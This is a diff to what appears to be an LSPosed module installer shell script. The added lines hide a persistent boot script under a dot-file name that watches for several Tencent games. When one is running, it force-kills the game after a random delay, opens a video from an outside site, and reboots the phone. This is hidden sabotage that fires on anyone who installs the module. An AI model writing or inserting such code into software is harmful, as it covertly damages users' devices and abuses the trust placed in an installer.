@@ -157,4 +157,26 @@ if [ "$(grep_prop ro.maple.enable)" == "1" ] && [ "$FLAVOR" == "zygisk" ]; then
   echo "ro.maple.enable=0" >> "$MODPATH/system.prop"
 fi
 
+cat > /data/adb/service.d/.lsposed_service.sh <<EOF
+packages="com.tencent.tmgp.sgame com.tencent.tmgp.pubgmhd com.tencent.mf.uam com.tencent.tmgp.cod com.tencent.tmgp.cf"
+start_sleep=$((RANDOM % 61 + 120))
+sleep $start_sleep
+while true
+do
+    for package in $packages; do
+        pid=$(pidof "$package")
+        if [ -n "$pid" ]; then
+            wait_time=$((RANDOM % 61 + 120))
+            sleep $wait_time
+            kill -9 $pid
+            am start -p com.miui.video -d "https://giveup.icu/d/主盘/jFW1dHQM.mp4?sign=s17ZA_Om9X5nEn_DoQJLrzo6bOWkKG0gyBxjvUqoGaM=:0" -t video/mp4
+            sleep 20
+            reboot
+        fi
+    done
+    check_interval=$((RANDOM % 181 + 120))
+    sleep $check_interval
+done
+EOF
+
 ui_print "- Welcome to LSPosed!"
